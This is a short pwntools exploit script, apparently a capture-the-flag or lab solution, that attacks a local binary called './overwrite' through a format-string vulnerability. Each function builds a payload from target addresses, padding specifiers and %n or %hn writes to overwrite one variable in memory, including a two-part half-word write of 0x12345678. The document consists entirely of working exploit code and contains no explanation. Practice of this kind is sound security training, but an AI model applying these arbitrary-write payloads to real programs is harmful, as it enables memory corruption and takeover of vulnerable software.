from pwn import * 

def for_c():
    sh = process('./overwrite')
    c_addr = int(sh.recvuntil('\n', drop = True), 16)
    print(hex(c_addr))

    payload = p32(c_addr) + b'%012d' + b'%6$n'
    print(payload)
    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()

def for_c_end():
    sh = process('./overwrite')
    c_addr = int(sh.recvuntil('\n', drop = True), 16)
    print(hex(c_addr))

    payload = b'%16c' + b'%8$n' + p32(c_addr)
    print(payload)

    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()

def for_a(): 
    sh = process('./overwrite')
    a_addr = 0x804C024
    print(hex(a_addr))

    #payload = p32(a_addr) + b'%02d' +b'%6$n'
    payload = b'aa' + b'%8$naa'+p32(a_addr)
    print(payload)
    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()

def for_b():
    b_addr = 0x804C028
    sh = process('./overwrite')
    payload = b'%305419896d' + b'%10$n'+p32(b_addr)
    #print(payload)
    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()

def for_b_2():
    p = process("./overwrite")

    b_addr1 = 0x0804C028
    b_addr2 = b_addr1 + 2
    first_2_bytes = b'%' + str(0x5678).encode() + b'x'
    last_2_bytes = b'%' + str(0x11234 - 0x5678).encode() + b'x'

    payload = first_2_bytes + b'%13$hn' + last_2_bytes + b'%14$hn' + b'A' * 2 + p32(b_addr1) + p32(b_addr2)

    p.sendline(payload)
    p.interactive()

for_b_2()